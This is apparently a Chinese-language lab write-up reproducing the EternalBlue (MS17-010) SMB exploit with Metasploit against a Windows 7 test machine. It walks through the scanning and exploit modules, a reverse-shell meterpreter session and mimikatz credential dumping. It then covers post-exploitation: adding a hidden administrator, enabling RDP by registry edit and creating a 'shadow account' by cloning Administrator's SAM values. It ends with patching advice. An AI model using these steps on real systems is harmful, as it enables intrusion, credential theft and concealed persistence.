漏洞复现之永恒之蓝(ms17-010)

漏洞
漏洞复现
发布日期:   2020-11-24
更新日期:   2020-11-25
文章字数:   1.5k
阅读时长:   5 分
阅读次数:  

漏洞描述

​ Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。

​ 2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。

影响版本

​ 目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。

复现环境

  • 攻击机：Kali 2020.08（IP：10.10.10.152）
  • 靶机：Windows 7 X64 （IP：10.10.10.129）

复现过程

0x01主机发现

  1. 在nmap中使用如下命令来探测本网段存活主机，操作结果如下图所示。

    nmap -r 10.10.10.0/24

    探测到ip为10.10.10.129的主机存活，并探测到开放445端口，而永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞。

0x02 进入MSF框架

  1. 输入msfconsole命令进入MSF框架，显示结果如下图所示。

  2. 输入search ms17-010命令，查看MSF框中与ms17-010相关的渗透模块，显示结果如下图所示。

    • auxiliary/scanner/smb/smb_ms17_010是扫描MS17-010永恒之蓝的模块，扫描或者说检查目标主机是否存在MS17-010永恒之蓝的漏洞；
    • exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码的模块，就是所说的漏洞利用模块。

0x03 ms17-010扫描模块

  1. 输入如下命令，使用永恒之蓝的扫描模块，操作结果如下图所示。

    use auxiliary/scanner/smb/smb_ms17_010

  2. 设置目标主机的IP（RHOST），输入如下命令，操作结果如下图所示。

    set rhosts 10.10.10.129

  3. 使用扫描探测，显示结果如下图所示。

    扫描结果显示目标主机可能存在永恒之蓝漏洞，下面使用攻击模块机型见攻击测试。

0x04 ms17-010攻击模块

  1. 使用如下命令进入永恒之蓝的攻击模块，操作结果如下图所示。

    use exploit/windows/smb/ms17_010_eternalblue

  2. 使用options命令查看必须要手动配置的参数，显示结果如下图所示。

  3. 使用set rhosts 10.10.10.129命令来设置远程主机的IP地址，操作结果如下图所示。

  4. 永恒之蓝攻击模块默认，缺省使用的Payload为windows/x64/meterpreter/reverse_tcp，如果想使用其他Payload需要重新设置，这里使用默认的Payload。

  5. 输入exploit命令后MSF开始攻击渗透，攻击成功后得到一个meterpreter会话，显示结果如下图所示。

  6. 输入shell拿到目标主机shell控制权，操作结果如下图所示。

    此时我们已经拿到了目标主机（WIN7）的shell控制权限，之后可以通过Shell对目标靶机进行控制。接下来就是进入了后渗透阶段。

  7. 用msf中的mimikatz，爆出目标主机的用户名和密码，Wdigest读取内存存放的账号密码，操作结果如下图所示。

0x05 后渗透阶段

  1. 首先使用如下命令创建一个用户并将其提权为管理员，操作结果如下图所示。

    net user admin$ 123.com /add
net localgroup administrators admin$ /add

  2. 提权以后我们需要打开目标主机的3389远程桌面端口，以便使用3389端口控制对方系统，输入如下命令，操作结果如下图所示。

    REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f

    使用nmap探测远程主机端口，显示结果如下图所示。

  3. 打开远程桌面后就需要登录测试一下，但是再测试之前最好先使用screenshot命令获取截屏，操作结果如下图所示。

  4. 使用如下命令连接目标主机的远程桌面，操作结果如下图所示。

    rdesktop 10.10.10.129

    在Windows 7中登录远程桌面时，若已经有用户登录，则会显示夺权信息，若无操作30s后会成功访问。

  5. 远程登录操作结果显示如下图所示。

0x06 影子账户

  1. 创建一个名为ss$的用户，操作结果如下图所示。

  2. 使用regedit打开注册表HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/，显示结果如下图所示。若打不开则需要设置权限，默认情况下SAM文件夹只有SYSTEM具有完全控制权限。

  3. 在Names文件夹中点击【ss$】，在右侧显示16进制数值如下图所示。

  4. 找到Administrator的十六进制数字，然后找到对应的00000（十六进制）文件夹打开，复制Administrator的000001F4文件夹里面的F值到我们的隐藏账户ss$里面的F值中，操作结果如下图所示。

  5. 找到Names里面的ss$和ss$对应的十六进制目录，右键导出到桌面，操作结果如下如所示。

  6. 使用net user ss$ /del命令删除ss$用户，操作结果如下图所示。

  7. 将刚刚导出的注册表信息重新导入，操作结果如下图所示。

  8. 使用影子账户ss$登录，其实是以Administrator的身份登录，影子账户所做操作，Administrator都可以看见。

漏洞修复

  • 升级微软补丁MS17-010

  • Windows7、Windows8、Windows10电脑启用Windows防火墙添加策略关闭135、137、138、139、445端口

  • (若有杀软)升级杀毒软件最新版本
